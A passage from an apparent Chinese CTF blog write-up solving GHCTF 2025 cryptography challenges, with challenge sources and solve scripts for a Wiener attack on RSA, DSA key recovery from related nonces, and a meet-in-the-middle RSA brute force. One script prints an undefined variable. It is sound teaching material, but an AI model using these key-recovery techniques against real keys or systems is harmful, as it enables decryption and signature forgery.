class="built_in">print</span>(RC)</span><br><span class="line">KP = matrix([[K / p, <span class="number">0</span>], [<span class="number">0</span>, K]])</span><br><span class="line"><span class="built_in">print</span>(KP)</span><br><span class="line">M = block_matrix([[P, <span class="number">0</span>], [RC, KP]], subdivide=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(M)</span><br><span class="line">shortest_vector = M.LLL()</span><br><span class="line">key = shortest_vector[<span class="number">1</span>, -<span class="number">2</span>] / K * p % p</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">key_bytes = <span class="built_in">str</span>(key).encode()[:<span class="number">16</span>]  <span class="comment"># 截取或填充为 16 字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 AES 解密器</span></span><br><span class="line">cipher = AES.new(key_bytes, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密并去除填充</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    decrypted = unpad(cipher.decrypt(ciphertext), <span class="number">16</span>)  <span class="comment"># 解密并去除填充</span></span><br><span class="line">    flag = decrypted.decode()  <span class="comment"># 解码为字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Recovered flag:&quot;</span>, flag)</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Incorrect decryption:&quot;</span>, e)</span><br></pre></td></tr></table></figure>

<h1 id="RSA-and-DSA"><a href="#RSA-and-DSA" class="headerlink" title="RSA_and_DSA"></a>RSA_and_DSA</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits, randint</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> randbelow</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">ink=getPrime(<span class="number">20</span>)</span><br><span class="line">p1= getPrime(<span class="number">512</span>)</span><br><span class="line">q1= getPrime(<span class="number">512</span>)</span><br><span class="line">N = p1* q1</span><br><span class="line">phi = (p1-<span class="number">1</span>) * (q1-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d1= getRandomNBitInteger(<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">if</span> GCD(d1, phi) == <span class="number">1</span>:</span><br><span class="line">        e = inverse(d1, phi)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">c_ink = <span class="built_in">pow</span>(ink, e, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c_ink=&#x27;</span>,c_ink)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e=&#x27;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;N=&#x27;</span>,N)</span><br><span class="line"></span><br><span class="line">k= getPrime(<span class="number">64</span>)</span><br><span class="line">q = getPrime(<span class="number">160</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">msg, pub, pri, k</span>):</span><br><span class="line">    (p,q,g,y) = pub</span><br><span class="line">    x = pri</span><br><span class="line">    r = <span class="built_in">int</span>(<span class="built_in">pow</span>(g, k, p) % q)</span><br><span class="line">    h = <span class="built_in">int</span>(hashlib.sha256(msg).digest().<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">    s = <span class="built_in">int</span>((h + x * r) * gmpy2.invert(k, q) % q)</span><br><span class="line">    <span class="keyword">return</span> (r, s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    temp = q * getrandbits(<span class="number">864</span>)</span><br><span class="line">    <span class="keyword">if</span> isPrime(temp + <span class="number">1</span>):</span><br><span class="line">        p = temp + <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">assert</span> p % q == <span class="number">1</span></span><br><span class="line">h = randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">g = <span class="built_in">pow</span>(h, (p - <span class="number">1</span>) // q, p)</span><br><span class="line">y = <span class="built_in">pow</span>(g, k, p)</span><br><span class="line">pub = (p,q,g,y)</span><br><span class="line">pri = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;(r1,s1)=&quot;</span>,sign(<span class="string">b&#x27;GHCTF-2025&#x27;</span>, pub, pri, k))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;(r2,s2)=&quot;</span>,sign(<span class="string">b&#x27;GHCTF-2025&#x27;</span>, pub, pri, k+ink))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;g= &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;q= &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p= &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;y= &#125;</span>&quot;</span>)</span><br><span class="line">key = hashlib.sha1(<span class="built_in">str</span>(pri).encode()).digest()[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag=<span class="string">&quot;NSSCTF&#123;xxxxxxxxx&#125;&quot;</span></span><br><span class="line">ciphertext = cipher.encrypt(pad(flag.encode(), <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ciphertext = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c_ink= 84329531596553394336538987023357227935440127545924398750500007122949822951975451942488164538560925222694222413022235832336439700420379598454619959178424907616592885325169668838139433265501326382467741883799799897305247164532663683724926267222341485376684034461780316163663624769479766276645610470850267093664</span></span><br><span class="line"><span class="string">e= 100797590979191597676081881632112443200677974501832055481332601002844223186483558337099380805371010917502984674789369037985572270571944684404114475915036053451756526659905789324413633016308331745100752282051937597697581233757669107763643041665187533373053952694612521031477624363476981177214961821456672635823</span></span><br><span class="line"><span class="string">N= 133020919573254586736009662994351483197630110046444622015176359062686053521475990861985101412597512894313048001198942449066636145265799205815566892581351543233960812384316942438814742826123037762680960898927252792974233266551853930274479435403549161383103059746381782668941421906340168652870371226382805032027</span></span><br><span class="line"><span class="string">(r1,s1)= (105538622724986198173818280402723234123231812870, 165871242333491991006684781121637801537623792920)</span></span><br><span class="line"><span class="string">(r2,s2)= (895673018852361693797535983771888430717799939767, 511956887428148277909616673338517730698888202223)</span></span><br><span class="line"><span class="string">g= 97444164915108666817264719918456841236668149777715575246719562319277238318814584882880249446488655758781498681349330709135670188875982069778879957837454582916193915374305422049064769688749957611500682447936476425649642359105731049262259786188565867271216015835626264543593116387612078934710741467063982007499</span></span><br><span class="line"><span class="string">q= 974306102330898613562307019447798934376234044213</span></span><br><span class="line"><span class="string">p= 113996945917185663452903189185812083054654586038361814576057637684218572059191009152754335053396974825607186512631652893899380922217026759410880236546966561476761050482902589270845489570126254333374605973087540746242818447451510386137109253463070487353845675998098620056687507969012229115435439218407426962991</span></span><br><span class="line"><span class="string">y= 8015503667614219250943034151839311927430676423719991507127801373333532219335171760992873121586820712328636972152697436159934583810723294897449200937370031784164230148453787378834760102389031574149857480339843366568164403131143385627621208571673677878768568991050568882099039880976450795530322753270408770484</span></span><br><span class="line"><span class="string">ciphertext = b&#x27;\xb0\ra\x9c\xeb9y\xd5k\xfde\xdfJ\xba\n\xce^u\xae\x81J8\xe4\x8da\xdf;H@WV5&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>不难看出是一个RSA和DSA的拼接，前半部分是一个RSA的维纳攻击，用正常连分数展开去打就可以，后半部分是一个DSA签名的线性K问题，具体的推导过程可以参考另一篇博客<a href="https://mi1n9.github.io/2024/08/17/DSA%E7%AD%BE%E5%90%8D/#more">DSA签名 | 浮白载笔</a>，这里就不过多赘述。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">c= <span class="number">84329531596553394336538987023357227935440127545924398750500007122949822951975451942488164538560925222694222413022235832336439700420379598454619959178424907616592885325169668838139433265501326382467741883799799897305247164532663683724926267222341485376684034461780316163663624769479766276645610470850267093664</span></span><br><span class="line">e= <span class="number">100797590979191597676081881632112443200677974501832055481332601002844223186483558337099380805371010917502984674789369037985572270571944684404114475915036053451756526659905789324413633016308331745100752282051937597697581233757669107763643041665187533373053952694612521031477624363476981177214961821456672635823</span></span><br><span class="line">n= <span class="number">133020919573254586736009662994351483197630110046444622015176359062686053521475990861985101412597512894313048001198942449066636145265799205815566892581351543233960812384316942438814742826123037762680960898927252792974233266551853930274479435403549161383103059746381782668941421906340168652870371226382805032027</span></span><br><span class="line">(r1,s1)= (<span class="number">105538622724986198173818280402723234123231812870</span>, <span class="number">165871242333491991006684781121637801537623792920</span>)</span><br><span class="line">(r2,s2)= (<span class="number">895673018852361693797535983771888430717799939767</span>, <span class="number">511956887428148277909616673338517730698888202223</span>)</span><br><span class="line">g= <span class="number">97444164915108666817264719918456841236668149777715575246719562319277238318814584882880249446488655758781498681349330709135670188875982069778879957837454582916193915374305422049064769688749957611500682447936476425649642359105731049262259786188565867271216015835626264543593116387612078934710741467063982007499</span></span><br><span class="line">q= <span class="number">974306102330898613562307019447798934376234044213</span></span><br><span class="line">p= <span class="number">113996945917185663452903189185812083054654586038361814576057637684218572059191009152754335053396974825607186512631652893899380922217026759410880236546966561476761050482902589270845489570126254333374605973087540746242818447451510386137109253463070487353845675998098620056687507969012229115435439218407426962991</span></span><br><span class="line">y= <span class="number">8015503667614219250943034151839311927430676423719991507127801373333532219335171760992873121586820712328636972152697436159934583810723294897449200937370031784164230148453787378834760102389031574149857480339843366568164403131143385627621208571673677878768568991050568882099039880976450795530322753270408770484</span></span><br><span class="line">ciphertext = <span class="string">b&#x27;\xb0\ra\x9c\xeb9y\xd5k\xfde\xdfJ\xba\n\xce^u\xae\x81J8\xe4\x8da\xdf;H@WV5&#x27;</span></span><br><span class="line">msg = <span class="string">b&#x27;GHCTF-2025&#x27;</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算连分数</span></span><br><span class="line"><span class="string">    :param x: 分子</span></span><br><span class="line"><span class="string">    :param y: 分母</span></span><br><span class="line"><span class="string">    :return: 连分数列表</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算传入列表最后的渐进分数</span></span><br><span class="line"><span class="string">    :param cf: 连分数列表</span></span><br><span class="line"><span class="string">    :return: 该列表最后的渐近分数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    numerator = <span class="number">0</span></span><br><span class="line">    denominator = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cf[::-<span class="number">1</span>]:</span><br><span class="line">        <span class="comment"># 这里的渐进分数分子分母要分开</span></span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> numerator, denominator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用韦达定理解出pq，x^2−(p+q)∗x+pq=0</span></span><br><span class="line"><span class="string">    :param a:x^2的系数</span></span><br><span class="line"><span class="string">    :param b:x的系数</span></span><br><span class="line"><span class="string">    :param c:pq</span></span><br><span class="line"><span class="string">    :return:p，q</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)</span><br><span class="line">    <span class="keyword">return</span> (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getGradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算列表所有的渐近分数</span></span><br><span class="line"><span class="string">    :param cf: 连分数列表</span></span><br><span class="line"><span class="string">    :return: 该列表所有的渐近分数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    gf = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cf) + <span class="number">1</span>):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    <span class="keyword">return</span> gf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param e:</span></span><br><span class="line"><span class="string">    :param n:</span></span><br><span class="line"><span class="string">    :return: 私钥d</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    <span class="keyword">for</span> d, k <span class="keyword">in</span> gf:</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        p, q = solve_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">d = wienerAttack(e, n)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line">ink = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(ink)</span><br><span class="line"></span><br><span class="line">h = <span class="built_in">int</span>(hashlib.sha256(<span class="string">b&#x27;GHCTF-2025&#x27;</span>).digest().<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">k = (h*r2-h*r1+ink*s2*r1)*<span class="built_in">pow</span>(s1*r2-s2*r1, -<span class="number">1</span>, q) % q</span><br><span class="line">pri = (k*s1-h) * <span class="built_in">pow</span>(r1, -<span class="number">1</span>, q) % q</span><br><span class="line">key = hashlib.sha1(<span class="built_in">str</span>(pri).encode()).digest()[:<span class="number">16</span>]</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">plaintext = cipher.decrypt(ciphertext)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line">k= ((h*(r2 - r1) + ink*r1*s2)*gmpy2.invert((r2*s1-<span class="number">1</span>*r1*s2),q)) % q</span><br><span class="line"></span><br><span class="line">m1 = (k*s1 - h)*gmpy2.invert(r1,q) % q</span><br><span class="line"><span class="built_in">print</span>(hashlib.sha1(<span class="built_in">str</span>(m1).encode()).digest()[:<span class="number">16</span>])</span><br></pre></td></tr></table></figure>

<h1 id="MIMT-RSA"><a href="#MIMT-RSA" class="headerlink" title="MIMT_RSA"></a>MIMT_RSA</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> KEY， flag  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">int</span>(KEY).bit_length() == <span class="number">36</span></span><br><span class="line"><span class="keyword">assert</span> <span class="keyword">not</span> isPrime(KEY)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">ck = <span class="built_in">pow</span>(KEY, e, n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">b&#x27;NSSCTF&#123;&#x27;</span> + md5(<span class="built_in">str</span>(KEY).encode()).hexdigest().encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ck = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 26563847822899403123579768059987758748518109506340688366937229057385768563897579939399589878779201509595131302887212371556759550226965583832707699167542469352676806103999861576255689028708092007726895892953065618536676788020023461249303717579266840903337614272894749021562443472322941868357046500507962652585875038973455411548683247853955371839865042918531636085668780924020410159272977805762814306445393524647460775620243065858710021030314398928537847762167177417552351157872682037902372485985979513934517709478252552309280270916202653365726591219198063597536812483568301622917160509027075508471349507817295226801011</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">ck = 8371316287078036479056771367631991220353236851470185127168826270131149168993253524332451231708758763231051593801540258044681874144589595532078353953294719353350061853623495168005196486200144643168051115479293775329183635187974365652867387949378467702492757863040766745765841802577850659614528558282832995416523310220159445712674390202765601817050315773584214422244200409445854102170875265289152628311393710624256106528871400593480435083264403949059237446948467480548680533474642869718029551240453665446328781616706968352290100705279838871524562305806920722372815812982124238074246044446213460443693473663239594932076</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一个很基本的RSA加密系统，并且给出了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> <span class="built_in">int</span>(KEY).bit_length() == <span class="number">36</span></span><br></pre></td></tr></table></figure>

<p>说明key的大小不大，结合题目MIMT(其实应该是MITM)也就是中间相遇攻击，说明爆破是可行的。并且KEY并不是一个素数，所以我们可以通过爆破其因子来间接得到KEY.</p>
<p>稍微推导一下</p>
<p>KEY$^e$≡ck(mod n)</p>
<p>(<em>a</em>∗b)$^e$≡ck (modn)</p>
<p>b$^e$≡ck*a$^{−e}$(modn)</p>
<p>所以分别爆破a和b即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">26563847822899403123579768059987758748518109506340688366937229057385768563897579939399589878779201509595131302887212371556759550226965583832707699167542469352676806103999861576255689028708092007726895892953065618536676788020023461249303717579266840903337614272894749021562443472322941868357046500507962652585875038973455411548683247853955371839865042918531636085668780924020410159272977805762814306445393524647460775620243065858710021030314398928537847762167177417552351157872682037902372485985979513934517709478252552309280270916202653365726591219198063597536812483568301622917160509027075508471349507817295226801011</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">ck = <span class="number">8371316287078036479056771367631991220353236851470185127168826270131149168993253524332451231708758763231051593801540258044681874144589595532078353953294719353350061853623495168005196486200144643168051115479293775329183635187974365652867387949378467702492757863040766745765841802577850659614528558282832995416523310220159445712674390202765601817050315773584214422244200409445854102170875265289152628311393710624256106528871400593480435083264403949059237446948467480548680533474642869718029551240453665446328781616706968352290100705279838871524562305806920722372815812982124238074246044446213460443693473663239594932076</span></span><br><span class="line"></span><br><span class="line">fa = &#123;&#125;</span><br><span class="line">fb = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> trange(<span class="number">1</span>, <span class="number">2</span>**<span class="number">20</span>):</span><br><span class="line">    fa[ck * <span class="built_in">pow</span>(a, -<span class="number">65537</span>, n) % n] = a</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> trange(<span class="number">1</span>, <span class="number">2</span>**<span class="number">20</span>):</span><br><span class="line">    fb[<span class="built_in">pow</span>(b, <span class="number">65537</span>, n)] = b</span><br><span class="line">results = <span class="built_in">set</span>(fa.keys()).intersection(<span class="built_in">set</span>(fb.keys()))  </span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">    a = fa[result]</span><br><span class="line">    b = fb[result]</span><br><span class="line">    key = a*b</span><br><span class="line">    <span class="built_in">print</span>(k)  </span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="EZ-Fermat-bag-PRO"><a href="#EZ-Fermat-bag-PRO" class="headerlink" title="EZ_Fermat_bag_PRO"></a>EZ_Fermat_bag_PRO</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> f, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">88</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;NSSCTF&#123;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">P.&lt;x,y&gt; = ZZ[]</span><br><span class="line">f = P(<span class="built_in">str</span>(f))</span><br><span class="line"></span><br><span class="line">w = <span class="built_in">pow</span>(<span class="number">2</span>,f(p,q),n)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(<span class="built_in">chr</span>(i) <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">set</span>(<span class="built_in">str</span>(p)))) <span class="keyword">for</span> i <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>:])</span><br><span class="line">c = bytes_to_long(flag) % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;f = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;w = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>\n&#x27;</span>)</span><br><span class="line">n = <span class="number">95656952327201449381426394713246214670537600365883923624876350719801926817916514429721785287844335184715049179879891389941974481490433975689601829920289485889138252888029716516069912637121531561601839948367426922036690701168975937162280451323099126372019216020898338909808577022618554997063496690156977790629</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">32384071331939239285992149489589967884022349189352515487950255250160126611084915524664364190130039873461090810189570222748422757594726643684332100753373557666031160718150203596579825955216919802911458293840557069152132506518827761626306871971480050052005979083878379439210757328323337697175682026549870910934</span></span><br><span class="line">f = x^<span class="number">31</span> - x^<span class="number">30</span>*y - <span class="number">2</span>*x^<span class="number">29</span>*y^<span class="number">2</span> + <span class="number">7</span>*x^<span class="number">28</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">27</span>*y^<span class="number">4</span> - <span class="number">4</span>*x^<span class="number">24</span>*y^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">23</span>*y^<span class="number">8</span> - x^<span class="number">20</span>*y^<span class="number">11</span> - <span class="number">4</span>*x^<span class="number">19</span>*y^<span class="number">12</span> + x^<span class="number">18</span>*y^<span class="number">13</span> - <span class="number">5</span>*x^<span class="number">17</span>*y^<span class="number">14</span> - <span class="number">4</span>*x^<span class="number">16</span>*y^<span class="number">15</span> - x^<span class="number">15</span>*y^<span class="number">16</span> + x^<span class="number">14</span>*y^<span class="number">17</span> + x^<span class="number">13</span>*y^<span class="number">18</span> + x^<span class="number">12</span>*y^<span class="number">19</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">20</span> - <span class="number">3</span>*x^<span class="number">9</span>*y^<span class="number">22</span> + <span class="number">5</span>*x^<span class="number">7</span>*y^<span class="number">24</span> + x^<span class="number">6</span>*y^<span class="number">25</span> + <span class="number">6</span>*x^<span class="number">4</span>*y^<span class="number">27</span> + x^<span class="number">3</span>*y^<span class="number">28</span> + <span class="number">2</span>*x*y^<span class="number">30</span> + y^<span class="number">31</span> - <span class="number">2</span>*x^<span class="number">30</span> - <span class="number">3</span>*x^<span class="number">29</span>*y + <span class="number">2</span>*x^<span class="number">28</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">27</span>*y^<span class="number">3</span> - x^<span class="number">26</span>*y^<span class="number">4</span> - x^<span class="number">25</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">23</span>*y^<span class="number">7</span> - <span class="number">3</span>*x^<span class="number">22</span>*y^<span class="number">8</span> - <span class="number">3</span>*x^<span class="number">20</span>*y^<span class="number">10</span> - <span class="number">4</span>*x^<span class="number">19</span>*y^<span class="number">11</span> + <span class="number">2</span>*x^<span class="number">18</span>*y^<span class="number">12</span> + x^<span class="number">15</span>*y^<span class="number">15</span> - x^<span class="number">14</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">18</span> - <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">19</span> - x^<span class="number">10</span>*y^<span class="number">20</span> + x^<span class="number">9</span>*y^<span class="number">21</span> + <span class="number">2</span>*x^<span class="number">8</span>*y^<span class="number">22</span> + x^<span class="number">7</span>*y^<span class="number">23</span> + x^<span class="number">5</span>*y^<span class="number">25</span> - x^<span class="number">4</span>*y^<span class="number">26</span> - <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">27</span> - <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">28</span> - y^<span class="number">30</span> - <span class="number">2</span>*x^<span class="number">29</span> - x^<span class="number">28</span>*y + <span class="number">3</span>*x^<span class="number">26</span>*y^<span class="number">3</span> - x^<span class="number">25</span>*y^<span class="number">4</span> - <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">5</span> + x^<span class="number">23</span>*y^<span class="number">6</span> - x^<span class="number">22</span>*y^<span class="number">7</span> - x^<span class="number">20</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">19</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">18</span>*y^<span class="number">11</span> + x^<span class="number">16</span>*y^<span class="number">13</span> + x^<span class="number">15</span>*y^<span class="number">14</span> + x^<span class="number">14</span>*y^<span class="number">15</span> + x^<span class="number">13</span>*y^<span class="number">16</span> + x^<span class="number">12</span>*y^<span class="number">17</span> + <span class="number">5</span>*x^<span class="number">11</span>*y^<span class="number">18</span> - x^<span class="number">9</span>*y^<span class="number">20</span> - <span class="number">2</span>*x^<span class="number">8</span>*y^<span class="number">21</span> - <span class="number">5</span>*x^<span class="number">7</span>*y^<span class="number">22</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">23</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">24</span> - <span class="number">5</span>*x^<span class="number">3</span>*y^<span class="number">26</span> - x^<span class="number">2</span>*y^<span class="number">27</span> + <span class="number">2</span>*x*y^<span class="number">28</span> - y^<span class="number">29</span> + <span class="number">3</span>*x^<span class="number">28</span> + <span class="number">3</span>*x^<span class="number">27</span>*y - <span class="number">2</span>*x^<span class="number">26</span>*y^<span class="number">2</span> + x^<span class="number">25</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">4</span> - x^<span class="number">23</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">22</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span 